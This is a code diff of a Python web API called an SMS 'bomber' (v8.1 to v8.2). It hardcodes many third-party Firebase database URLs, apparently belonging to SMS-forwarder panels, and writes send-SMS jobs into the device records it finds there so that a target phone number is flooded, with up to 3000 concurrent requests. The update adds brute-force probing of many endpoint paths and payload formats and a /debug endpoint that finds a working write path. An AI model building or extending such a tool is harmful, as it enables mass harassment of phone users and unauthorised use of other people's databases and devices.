@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 @BRONX_ULTRA BOMBER API v8.1 — ULTRA FLASH         ║
+║   🔥 @BRONX_ULTRA BOMBER API v8.2 — ULTRA FLASH         ║
 ║   ▸ API Key Protected                                   ║
 ║   ▸ Firebase URLs — SEEDHA CODE ME                      ║
 ║   ▸ TRUE Full Fan-Out                                   ║
 ║   ▸ Full Symbol/Space/Emoji Support                     ║
+║   ▸ Multi-Format Payload (auto match)                   ║
+║   ▸ Multi-Endpoint Fallback                             ║
 ║   ▸ /stop endpoint (local memory)                       ║
+║   ▸ /debug endpoint (troubleshoot)                      ║
 ║   ▸ Render + UptimeRobot Ready                          ║
-║   ▸ NO Redis, NO env var — Pure & Simple                ║
 ╚══════════════════════════════════════════════════════════╝
 """
 
@@ -38,298 +40,31 @@ VALID_KEYS = {
 
 # ═══════════════════════════════════════════════════════════
 # 🔥 FIREBASE URLs — YAHAN APNE URLs DAALO
-#    Comma ke baad naya URL, dedupe automatic hoga
-#    100-500+ URLs daal sakte ho
 # ═══════════════════════════════════════════════════════════
 FIREBASE_URLS = [
     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-        "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
-    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
-    "https://rambhai-2c356-default-rtdb.firebaseio.com",
-    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
-    "https://surajptiyanka-default-rtdb.firebaseio.com",
-    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
-    "https://online-a2823-default-rtdb.firebaseio.com",
-    "https://awakenn88-default-rtdb.firebaseio.com",
-    "https://adityakaapp-default-rtdb.firebaseio.com",
-    "https://amaat-a7916-default-rtdb.firebaseio.com",
-    "https://amit-6f40a-default-rtdb.firebaseio.com",
-    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
-    "https://bali-7acc3-default-rtdb.firebaseio.com",
-    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com",
-    "https://botsieeee-af07c-default-rtdb.firebaseio.com",
-    "https://gadhalalund-default-rtdb.firebaseio.com",
-    "https://iiilsoee-default-rtdb.firebaseio.com",
-    "https://lucky-c0915-default-rtdb.firebaseio.com",
-    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://nidhi-rani-default-rtdb.firebaseio.com",
-    "https://nowammyxdd-default-rtdb.firebaseio.com",
-    "https://ramu-c81a7-default-rtdb.firebaseio.com",
-    "https://rohitbona-d8308-default-rtdb.firebaseio.com",
-    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com",
-    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
-    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
-    "https://aditya-9f66b-default-rtdb.firebaseio.com",
-    "https://alwaysatiif7-default-rtdb.firebaseio.com",
-    "https://bega-8457c-default-rtdb.firebaseio.com",
-    "https://check-skyler-default-rtdb.firebaseio.com",
-    "https://chilgumsir-default-rtdb.firebaseio.com",
-    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
-    "https://deepk-hh-default-rtdb.firebaseio.com",
-    "https://desert-fc320-default-rtdb.firebaseio.com",
-    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
-    "https://gfaatelisell-default-rtdb.firebaseio.com",
-    "https://htbc51-default-rtdb.firebaseio.com",
-    "https://kalih-f389d-default-rtdb.firebaseio.com",
-    "https://keepsnss-default-rtdb.firebaseio.com",
-    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
-    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
-    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
-    "https://maxo12-default-rtdb.firebaseio.com",
-    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
-    "https://mook-1ddfc-default-rtdb.firebaseio.com",
-    "https://navin-9fb56-default-rtdb.firebaseio.com",
-    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
-    "https://sk-paid-panel-default-rtdb.firebaseio.com",
-    "https://tinmur-777e8-default-rtdb.firebaseio.com",
-    "https://vasu-new-panel-default-rtdb.firebaseio.com",
-    "https://bhai-138a8-default-rtdb.firebaseio.com",
-    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
-    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
-    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
-    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
-    "https://adani-5dd2c-default-rtdb.firebaseio.com",
-    "https://pintu-3f058-default-rtdb.firebaseio.com",
-    "https://kunal-86274-default-rtdb.firebaseio.com",
-    "https://sunil-da-default-rtdb.firebaseio.com",
-    "https://rk-panell-default-rtdb.firebaseio.com",
-    "https://jime-10a55-default-rtdb.firebaseio.com",
-    "https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
-    "https://saaasaa-c28c1-default-rtdb.firebaseio.com",
-    "https://room-hotel-default-rtdb.firebaseio.com",
-    "https://subjuoeh-default-rtdb.firebaseio.com",
-    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://kunal-86274-default-rtdb.firebaseio.com",
-    "https://fwwg-d04bc-default-rtdb.firebaseio.com",
-    "https://alok5u2-default-rtdb.firebaseio.com",
-    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
-    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
-    "https://project9-default-rtdb.firebaseio.com",
-    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
-     "https://dhiraj2323-2409a-default-rtdb.firebaseio.com",
-"https://hush-e1f72-default-rtdb.firebaseio.com",
-"https://a4jaat-208cb-default-rtdb.firebaseio.com",
-"https://babuji-efd18-default-rtdb.firebaseio.com",
-"https://sk-paid-panel-default-rtdb.firebaseio.com",
-"https://saniapanel-default-rtdb.firebaseio.com",
-"https://mr-sapyedr-default-rtdb.firebaseio.com",
+    "https://hush-e1f72-default-rtdb.firebaseio.com",
 "https://adsinprogess-default-rtdb.firebaseio.com",
 "https://sumnmmn-default-rtdb.firebaseio.com",
-"https://arunhah-902ef-default-rtdb.firebaseio.com",
 "https://ffdfhf-aa168-default-rtdb.firebaseio.com",
-"https://pm-kishan-b4-default-rtdb.firebaseio.com",
-"https://rahulbhai-ff15445-default-rtdb.firebaseio.com",
-"https://svuhgfgg-default-rtdb.firebaseio.com",
 "https://pussy-25f3c-default-rtdb.firebaseio.com",
-"https://aryanhaisharma-f2739-default-rtdb.firebaseio.com",
-"https://ramji-be5c6-default-rtdb.firebaseio.com",
-"https://fir-project-175f2-default-rtdb.firebaseio.com",
-"https://santosh-3eeca-default-rtdb.firebaseio.com",
-"https://ariyan-kelvin-default-rtdb.firebaseio.com",
-"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
-"https://rosan-9a68d-default-rtdb.firebaseio.com",
 "https://sohan-6d9e1-default-rtdb.firebaseio.com",
-"https://davil-d4e77-default-rtdb.firebaseio.com",
-"https://ramchandra62-51fbe-default-rtdb.firebaseio.com",
-"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
-"https://aya-wed-anvith-default-rtdb.firebaseio.com",
-"https://babu-2b2c2-default-rtdb.firebaseio.com",
 "https://slim-pussy-default-rtdb.firebaseio.com",
-"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
 "https://skfd-53f1f-default-rtdb.firebaseio.com",
-"https://pm-kisan-15jg-default-rtdb.firebaseio.com",
-"https://mkdmoo-default-rtdb.firebaseio.com",
 "https://e0turnament1-default-rtdb.firebaseio.com",
-"https://helloooookk-default-rtdb.firebaseio.com",
-"https://rahul6494-f9457-default-rtdb.firebaseio.com",
-"https://harami-fe6e1-default-rtdb.firebaseio.com",
 "https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://fir-d327e-default-rtdb.firebaseio.com",
-"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://suman-7a301-default-rtdb.firebaseio.com",
-"https://ship-admin-panel-da53b-default-rtdb.firebaseio.com",
-"https://aditya-5959e-default-rtdb.firebaseio.com",
-"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
-"https://customer4-ca47c-default-rtdb.firebaseio.com",
 "https://amit-ka-71-default-rtdb.firebaseio.com",
-"https://hshshhs-51f68-default-rtdb.firebaseio.com",
-"https://naina-singh-default-rtdb.firebaseio.com",
-"https://myname-cc45a-default-rtdb.firebaseio.com",
-"https://gadhalalund-default-rtdb.firebaseio.com",
 "https://sachin-38c1d-default-rtdb.firebaseio.com",
-"https://sirsaa-ea24e-default-rtdb.firebaseio.com",
-"https://customer-19no-10augu-default-rtdb.firebaseio.com",
-"https://gasbooking-15494-default-rtdb.firebaseio.com",
 "https://newbhai-99806-default-rtdb.firebaseio.com",
-"https://bibli-roy-default-rtdb.firebaseio.com",
 "https://ssboss4-default-rtdb.firebaseio.com",
-"https://rahulrnj-6e235-default-rtdb.firebaseio.com",
-"https://gollsrka-default-rtdb.firebaseio.com",
-"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
-"https://room-hotel-default-rtdb.firebaseio.com",
-"https://dhiko0909-default-rtdb.firebaseio.com",
 "https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
 "https://teddymcdonald-81002-default-rtdb.firebaseio.com",
 "https://santosh-c4095-default-rtdb.firebaseio.com",
-"https://alok5u2-default-rtdb.firebaseio.com",
-"https://saaasaa-c28c1-default-rtdb.firebaseio.com",
-"https://subjuoeh-default-rtdb.firebaseio.com",
-"https://fwwg-d04bc-default-rtdb.firebaseio.com",
-"https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
-"https://kunal-86274-default-rtdb.firebaseio.com",
-"https://rk-panell-default-rtdb.firebaseio.com",
-"https://sunil-da-default-rtdb.firebaseio.com",
-"https://jime-10a55-default-rtdb.firebaseio.com",
 "https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
 "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://sannn-5d617-default-rtdb.firebaseio.com",
-"https://fir-24851-default-rtdb.firebaseio.com",
-"https://mxla-16265-default-rtdb.firebaseio.com",
-"https://warsondk-default-rtdb.firebaseio.com",
-"https://lvdapanalb-default-rtdb.firebaseio.com",
-"https://senu-cbca6-default-rtdb.firebaseio.com",
 "https://rahul-admin-b6ebe-default-rtdb.firebaseio.com",
-"https://simran-2f56c-default-rtdb.firebaseio.com",
-"https://panel-jack-default-rtdb.firebaseio.com",
-"https://dippsanj-4fe1c-default-rtdb.firebaseio.com",
-"https://akshhhhhhhh-default-rtdb.firebaseio.com",
-"https://kaha-9d4ce-default-rtdb.firebaseio.com",
 "https://super-admin-240f4-default-rtdb.firebaseio.com",
 "https://ilohsh-default-rtdb.firebaseio.com",
-    "https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://a4jaat-208cb-default-rtdb.firebaseio.com",
-"https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://sanjay-16691-default-rtdb.firebaseio.com",
-"https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com",
-"https://saniapanel-default-rtdb.firebaseio.com",
-"https://sumnmmn-default-rtdb.firebaseio.com",
-"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
-"https://crdio-3cf5c-default-rtdb.firebaseio.com",
-"https://sk-paid-panel-default-rtdb.firebaseio.com",
-"https://adsinprogess-default-rtdb.firebaseio.com",
-"https://mr-sapyedr-default-rtdb.firebaseio.com",
-"https://himanmi-936db-default-rtdb.firebaseio.com",
-"https://ariyan-kelvin-default-rtdb.firebaseio.com",
-"https://pm-kishan-b4-default-rtdb.firebaseio.com",
-"https://hyper-cheat-3f53a-default-rtdb.firebaseio.com",
-"https://fir-e8ad7-default-rtdb.firebaseio.com",
-"https://davil-d4e77-default-rtdb.firebaseio.com",
-"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
-"https://santosh-3eeca-default-rtdb.firebaseio.com",
-"https://ramchandra62-51fbe-default-rtdb.firebaseio.com",
-"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
-"https://pm-kisan-15jg-default-rtdb.firebaseio.com",
-"https://mkdmoo-default-rtdb.firebaseio.com",
-"https://rosan-9a68d-default-rtdb.firebaseio.com",
-"https://aya-wed-anvith-default-rtdb.firebaseio.com",
-"https://slim-pussy-default-rtdb.firebaseio.com",
-"https://babu-2b2c2-default-rtdb.firebaseio.com",
-"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://skfd-53f1f-default-rtdb.firebaseio.com",
-"https://e0turnament1-default-rtdb.firebaseio.com",
-"https://pnb-one-a13-default-rtdb.firebaseio.com",
-"https://rahul6494-f9457-default-rtdb.firebaseio.com",
-"https://harami-fe6e1-default-rtdb.firebaseio.com",
-"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://helloooookk-default-rtdb.firebaseio.com",
-"https://suman-7a301-default-rtdb.firebaseio.com",
-"https://aditya-5959e-default-rtdb.firebaseio.com",
-"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
-"https://customer4-ca47c-default-rtdb.firebaseio.com",
-"https://naina-singh-default-rtdb.firebaseio.com",
-"https://amit-ka-71-default-rtdb.firebaseio.com",
-"https://fir-d327e-default-rtdb.firebaseio.com",
-"https://hshshhs-51f68-default-rtdb.firebaseio.com",
-"https://ship-admin-panel-da53b-default-rtdb.firebaseio.com",
-"https://myname-cc45a-default-rtdb.firebaseio.com",
-"https://gadhalalund-default-rtdb.firebaseio.com"
-"https://sachin-38c1d-default-rtdb.firebaseio.com",
-"https://customer-19no-10augu-default-rtdb.firebaseio.com",
-"https://sirsaa-ea24e-default-rtdb.firebaseio.com",
-"https://gasbooking-15494-default-rtdb.firebaseio.com",
-"https://jime-10a55-default-rtdb.firebaseio.com",
-"https://newbhai-99806-default-rtdb.firebaseio.com",
-"https://fir-24851-default-rtdb.firebaseio.com",
-"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
-"https://nisha-randi-default-rtdb.firebaseio.com",
-"https://yohichahiye-default-rtdb.firebaseio.com",
-"https://krisna574-ffef3-default-rtdb.firebaseio.com",
-"https://lvdapanalb-default-rtdb.firebaseio.com",
-"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
-"https://warsondk-default-rtdb.firebaseio.com",
-"https://pspjakaoakalnaklwj-default-rtdb.firebaseio.com",
-"https://e0turnament1-default-rtdb.firebaseio.com",
-"https://teligrampmsell-default-rtdb.firebaseio.com",
-"https://fir-d327e-default-rtdb.firebaseio.com",
-"https://rahul6494-f9457-default-rtdb.firebaseio.com",
-"https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://mpariwhan-default-rtdb.firebaseio.com",
-"https://aaaa-3bd33-default-rtdb.firebaseio.com",
-"https://mxla-16265-default-rtdb.firebaseio.com",
-"https://navin-9fb56-default-rtdb.firebaseio.com",
-"https://ilohsh-default-rtdb.firebaseio.com",
-"https://mewoo-7087f-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://babuji-efd18-default-rtdb.firebaseio.com",
-"https://dhiraj2323-2409a-default-rtdb.firebaseio.com",
-"https://saniapanel-default-rtdb.firebaseio.com",
-"https://crdio-3cf5c-default-rtdb.firebaseio.com",
-"https://mr-sapyedr-default-rtdb.firebaseio.com",
-"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
-"https://adsinprogess-default-rtdb.firebaseio.com",
-"https://ariyan-kelvin-default-rtdb.firebaseio.com",
-"https://himanmi-936db-default-rtdb.firebaseio.com",
-"https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
-"https://rosan-9a68d-default-rtdb.firebaseio.com",
-"https://davil-d4e77-default-rtdb.firebaseio.com",
-"https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
-"https://babu-2b2c2-default-rtdb.firebaseio.com",
-"https://slim-pussy-default-rtdb.firebaseio.com",
-"https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://skfd-53f1f-default-rtdb.firebaseio.com",
-"https://mkdmoo-default-rtdb.firebaseio.com",
-"https://aya-wed-anvith-default-rtdb.firebaseio.com",
-"https://helloooookk-default-rtdb.firebaseio.com",
-"https://harami-fe6e1-default-rtdb.firebaseio.com",
-"https://amit-ka-71-default-rtdb.firebaseio.com",
-"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
-"https://naina-singh-default-rtdb.firebaseio.com",
-"https://hshshhs-51f68-default-rtdb.firebaseio.com",
-"https://myname-cc45a-default-rtdb.firebaseio.com",
-"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://a4jaat-208cb-default-rtdb.firebaseio.com"
-"https://harami-fe6e1-default-rtdb.firebaseio.com",
-"https://amit-ka-71-default-rtdb.firebaseio.com",
-"https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
-"https://naina-singh-default-rtdb.firebaseio.com",
-"https://hshshhs-51f68-default-rtdb.firebaseio.com",
-"https://myname-cc45a-default-rtdb.firebaseio.com",
-"https://newbhai-99806-default-rtdb.firebaseio.com",
-"https://aaaa-3bd33-default-rtdb.firebaseio.com",
-"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
-"https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
-"https://warsondk-default-rtdb.firebaseio.com",
-"https://yohichahiye-default-rtdb.firebaseio.com",
-"https://rahul6494-f9457-default-rtdb.firebaseio.com",
-"https://teligrampmsell-default-rtdb.firebaseio.com",
-"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://adsinprogess-default-rtdb.firebaseio.com",
-"https://krisna574-ffef3-default-rtdb.firebaseio.com",
-"https://lvdapanalb-default-rtdb.firebaseio.com",
-"https://a4jaat-208cb-default-rtdb.firebaseio.com",
-"https://mr-sapyedr-default-rtdb.firebaseio.com",
 ]
 
 # ─── Auto dedupe + clean ───────────────────────────────────
@@ -344,25 +79,93 @@ for u in FIREBASE_URLS:
         _cleaned.append(u)
 FIREBASE_URLS = _cleaned
 
+# ═══════════════════════════════════════════════════════════
+# 🎯 SEND ENDPOINTS — Bahut saare try karega
+# ═══════════════════════════════════════════════════════════
 SEND_ENDPOINTS = [
+    # Standard webhook patterns
     "clients/{id}/webhookEvent/sendSms.json",
     "clients/{id}/webhookEvent/sendSmsRequest.json",
     "clients/{id}/webhookEvent/sms.json",
+    "clients/{id}/webhookEvent/send.json",
+    "clients/{id}/webhookEvent.json",
+    # Direct send patterns
     "clients/{id}/sendSms.json",
+    "clients/{id}/sms.json",
+    "clients/{id}/send.json",
+    "clients/{id}/message.json",
+    # Top-level
     "sendSms/{id}.json",
+    "sms/{id}.json",
+    "send/{id}.json",
+    # Device direct
+    "clients/{id}/messages.json",
+    "clients/{id}/inbox.json",
 ]
 
 # ═══════════════════════════════════════════════════════════
-# ⚙️ ULTRA FLASH SETTINGS
+# 📦 PAYLOAD FORMATS — Har format try karega
+# ═══════════════════════════════════════════════════════════
+def build_payloads(target: str, message: str):
+    """Return list of payloads in different formats."""
+    ts = int(time.time() * 1000)
+    return [
+        # Format 1 — Standard Bronx/Android SMS forwarder
+        {
+            "from": 1,
+            "to": target,
+            "message": message,
+            "isSended": False,
+            "timestamp": ts,
+        },
+        # Format 2 — Android SMS Gateway style
+        {
+            "phone": target,
+            "message": message,
+            "isSended": False,
+            "timestamp": ts,
+        },
+        # Format 3 — Firebase push notification style
+        {
+            "to": target,
+            "body": message,
+            "title": "",
+            "isSended": False,
+            "timestamp": ts,
+        },
+        # Format 4 — Full combo (kuch devices sab fields chahte hain)
+        {
+            "from": 1,
+            "to": target,
+            "phone": target,
+            "number": target,
+            "message": message,
+            "msg": message,
+            "text": message,
+            "body": message,
+            "isSended": False,
+            "status": False,
+            "timestamp": ts,
+        },
+        # Format 5 — Minimal
+        {
+            "to": target,
+            "msg": message,
+        },
+    ]
+
+
+# ═══════════════════════════════════════════════════════════
+# ⚙️ SETTINGS
 # ═══════════════════════════════════════════════════════════
 MAX_CONCURRENT = 3000
 BATCH_CHUNK = 3000
-REQUEST_TIMEOUT = 6
-CONNECT_TIMEOUT = 2
+REQUEST_TIMEOUT = 8
+CONNECT_TIMEOUT = 3
 DEVICE_CACHE_TTL = 30
 
 API_NAME = "@BRONX_ULTRA"
-API_VERSION = "8.1"
+API_VERSION = "8.2"
 
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
@@ -380,9 +183,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ═══════════════════════════════════════════════════════════
-# 🛑 LOCAL STOP (in-memory only)
-# ═══════════════════════════════════════════════════════════
 _LOCAL_STOP = set()
 _DEVICE_CACHE = {"devices": None, "ts": 0}
 
@@ -423,12 +223,10 @@ def clean_url(url: str) -> str:
 
 
 def fix_message(raw_message, is_get: bool) -> str:
-    """Full symbol/space/emoji support."""
     if raw_message is None:
         return ""
     if not isinstance(raw_message, str):
         raw_message = str(raw_message)
-
     msg = raw_message
     if is_get:
         msg = msg.replace("+", " ")
@@ -448,11 +246,15 @@ async def fetch_devices_from(session, url):
             data = await r.json(content_type=None)
             if not isinstance(data, dict):
                 return []
-            return [
-                {"id": k, "url": base}
-                for k, v in data.items()
-                if isinstance(v, dict) and v.get("status") is True
-            ]
+            devices = []
+            for k, v in data.items():
+                if not isinstance(v, dict):
+                    continue
+                # status true ya missing dono accept karo
+                status = v.get("status", True)
+                if status is True or status == "true" or status is None:
+                    devices.append({"id": k, "url": base})
+            return devices
     except Exception:
         return []
 
@@ -478,29 +280,44 @@ async def get_all_devices(session, use_cache=False):
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 SEND ONE
+# 💣 SEND ONE — Multi-format + Multi-endpoint try
 # ═══════════════════════════════════════════════════════════
 async def send_one(session, device, target, message, sem, stats):
     async with sem:
-        payload = {
-            "from": 1,
-            "to": target,
-            "message": message,
-            "isSended": False,
-            "timestamp": int(time.time() * 1000),
-        }
+        payloads = build_payloads(target, message)
+
         for ep in SEND_ENDPOINTS:
             url = f"{device['url']}/{ep.format(id=device['id'])}"
-            try:
-                async with session.put(url, json=payload) as r:
-                    if r.status in (200, 201):
-                        stats["success"] += 1
-                        return True
-                    if r.status == 403:
-                        stats["blocked"] += 1
-                        return False
-            except Exception:
-                continue
+
+            # Har payload format try karo
+            for payload in payloads:
+                # PUT try
+                try:
+                    async with session.put(url, json=payload) as r:
+                        if r.status in (200, 201):
+                            stats["success"] += 1
+                            return True
+                        if r.status == 403:
+                            stats["blocked"] += 1
+                            break  # 403 = blocked, next endpoint try
+                        if r.status == 404:
+                            break  # 404 = endpoint galat, next endpoint
+                except Exception:
+                    pass
+
+                # POST try
+                try:
+                    async with session.post(url, json=payload) as r:
+                        if r.status in (200, 201):
+                            stats["success"] += 1
+                            return True
+                        if r.status == 403:
+                            break
+                        if r.status == 404:
+                            break
+                except Exception:
+                    pass
+
         stats["failed"] += 1
         return False
 
@@ -510,7 +327,7 @@ async def is_stopped(number: str) -> bool:
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 WORKER — ULTRA FLASH ⚡
+# 💣 WORKER
 # ═══════════════════════════════════════════════════════════
 async def bomb_worker(number: str, message: str, count: int, api_key: str):
     jid = str(uuid4())[:8]
@@ -587,6 +404,7 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
             speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
             print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                   f"OK={stats['success']} | BLK={stats['blocked']} | "
+                  f"FAIL={stats['failed']} | "
                   f"{elapsed_sf:.1f}s | {speed_sf}/s")
 
         elapsed = round(time.time() - t0, 2)
@@ -615,12 +433,11 @@ async def root():
             "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
             "stop": "/stop?key=YOUR_KEY&number=9876543210",
             "devices": "/devices?key=YOUR_KEY",
+            "debug": "/debug?key=YOUR_KEY",
         },
-        "header_alternative": "X-API-Key: YOUR_KEY",
     }
 
 
-# 🟢 UPTIMEROBOT — halka aur fast
 @app.get("/health")
 async def health():
     return {
@@ -716,7 +533,7 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
         "message_sent": message,
         "message_length": len(message),
         "per_device": count,
-        "mode": "ULTRA FLASH FAN-OUT",
+        "mode": "ULTRA FLASH FAN-OUT (multi-format)",
         "stop_url": f"/stop?key={api_key}&number={clean_number}",
     }
 
@@ -794,12 +611,12 @@ async def devices_endpoint(request: Request, key: str = Query(None)):
         "live_firebases": len(fb_group),
         "total_firebases": len(FIREBASE_URLS),
         "per_firebase": dict(fb_group),
-        "devices": devices,
+        "devices_sample": devices[:10],
     }
 
 
 # ═══════════════════════════════════════════════════════════
-# 🌐 /firebases  — URLs HIDE (count only)
+# 🌐 /firebases
 # ═══════════════════════════════════════════════════════════
 @app.get("/firebases")
 async def firebases_endpoint():
@@ -810,3 +627,100 @@ async def firebases_endpoint():
         "total": len(FIREBASE_URLS),
         "note": "🔒 Firebase URLs are hidden",
     }
+
+
+# ═══════════════════════════════════════════════════════════
+# 🔬 /debug — Exact reason batayega
+# ═══════════════════════════════════════════════════════════
+@app.get("/debug")
+async def debug_endpoint(request: Request, key: str = Query(None)):
+    api_key = key or request.headers.get("x-api-key") or ""
+    if not verify_key(api_key):
+        return JSONResponse(
+            {"success": False, "error": "🔑 Valid key required"}, 401
+        )
+
+    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
+    timeout = aiohttp.ClientTimeout(total=20, connect=5)
+    headers = {"Content-Type": "application/json"}
+
+    async with aiohttp.ClientSession(
+        connector=connector, timeout=timeout, headers=headers
+    ) as session:
+        devices = await get_all_devices(session, use_cache=False)
+
+        if not devices:
+            return {"success": False, "error": "No devices online"}
+
+        # Pehla device test karo
+        test_dev = devices[0]
+        target = "9876543210"
+        message = "debug test"
+
+        # Device ka full structure dekho
+        struct_url = f"{test_dev['url']}/clients/{test_dev['id']}.json"
+        device_struct = None
+        try:
+            async with session.get(struct_url) as r:
+                device_struct = await r.json(content_type=None)
+        except Exception as e:
+            device_struct = {"error": str(e)}
+
+        # Har endpoint × har payload test karo
+        payloads = build_payloads(target, message)
+        results = []
+
+        for ep in SEND_ENDPOINTS:
+            url = f"{test_dev['url']}/{ep.format(id=test_dev['id'])}"
+            ep_result = {"endpoint": ep, "tries": []}
+
+            for idx, payload in enumerate(payloads):
+                for method in ("PUT", "POST"):
+                    try:
+                        if method == "PUT":
+                            async with session.put(url, json=payload) as r:
+                                status = r.status
+                                body = (await r.text())[:150]
+                        else:
+                            async with session.post(url, json=payload) as r:
+                                status = r.status
+                                body = (await r.text())[:150]
+
+                        ep_result["tries"].append({
+                            "method": method,
+                            "payload_fmt": idx + 1,
+                            "status": status,
+                            "body": body,
+                        })
+
+                        if status in (200, 201):
+                            ep_result["WORKING"] = {
+                                "method": method,
+                                "payload_fmt": idx + 1,
+                                "payload": payload,
+                            }
+                            break
+                    except Exception as e:
+                        ep_result["tries"].append({
+                            "method": method,
+                            "payload_fmt": idx + 1,
+                            "error": str(e)[:80],
+                        })
+                if "WORKING" in ep_result:
+                    break
+
+            results.append(ep_result)
+            if "WORKING" in ep_result:
+                break
+
+        return {
+            "success": True,
+            "total_devices": len(devices),
+            "test_device_id": test_dev["id"],
+            "test_device_url": test_dev["url"],
+            "device_structure": device_struct,
+            "endpoint_results": results,
+            "verdict": "✅ FOUND WORKING ENDPOINT" if any(
+                "WORKING" in r for r in results
+            ) else "❌ NO WORKING ENDPOINT — check device structure",
+        }
